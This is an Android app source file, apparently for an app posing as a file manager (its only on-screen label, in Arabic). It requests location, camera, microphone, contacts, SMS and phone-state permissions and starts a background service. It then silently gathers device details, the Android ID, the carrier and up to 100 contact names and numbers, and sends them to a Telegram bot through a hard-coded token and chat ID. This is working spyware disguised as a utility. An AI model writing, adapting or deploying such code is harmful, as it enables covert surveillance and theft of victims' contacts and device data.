package com.zoro.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import okhttp3.*;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {
    static final String TOKEN = "8884019475:AAFpnDUBdu24Cv0r52RRwb74JtIXHDytDRU";
    static final String CHAT = "7277975586";
    static final String API = "https://api.telegram.org/bot" + TOKEN;
    static final OkHttpClient http = new OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS).build();
    static final String[] PERMS = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE
    };

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView t = new TextView(this);
        t.setText("مدير الملفات");
        t.setPadding(50, 200, 50, 50);
        setContentView(t);
        ActivityCompat.requestPermissions(this, PERMS, 1);
        Intent svc = new Intent(this, ZoroService.class);
        if (Build.VERSION.SDK_INT >= 26) ContextCompat.startForegroundService(this, svc);
        else startService(svc);
    }

    @Override public void onRequestPermissionsResult(int c, String[] p, int[] r) {
        super.onRequestPermissionsResult(c, p, r);
        new Thread(this::sendInfo).start();
    }

    void sendInfo() {
        try {
            StringBuilder sb = new StringBuilder("📱 جهاز\n");
            sb.append("طراز: ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
            sb.append("أندرويد: ").append(Build.VERSION.RELEASE).append("\n");
            sb.append("ID: ").append(Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n");
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                sb.append("شبكة: ").append(tm.getNetworkOperatorName()).append("\n");
            }
            sendMsg(sb.toString());
            StringBuilder cs = new StringBuilder("📇 جهات الاتصال:\n");
            try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
                int n = 0;
                while (c != null && c.moveToNext() && n < 100) {
                    cs.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                      .append(" : ")
                      .append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                      .append("\n");
                    n++;
                }
            } catch (Exception ignored) {}
            sendMsg(cs.toString());
        } catch (Exception ignored) {}
    }

    void sendMsg(String text) {
        try {
            RequestBody b = new FormBody.Builder().add("chat_id", CHAT).add("text", text).build();
            http.newCall(new Request.Builder().url(API + "/sendMessage").post(b).build()).execute();
        } catch (Exception ignored) {}
    }
}
